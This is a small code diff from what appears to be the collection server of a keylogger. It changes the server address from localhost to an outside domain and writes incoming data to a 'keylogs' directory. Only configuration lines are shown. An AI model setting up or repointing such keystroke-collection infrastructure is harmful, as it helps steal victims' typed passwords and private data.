@@ -7,7 +7,7 @@ import os
 print("============================== This is server's console ==============================")
 
 # Define the server's IP address and port
-server_ip = '127.0.0.1'
+server_ip = 'seannotseen.com'
 server_port = 15683
 
 log_directory = "keylogs"
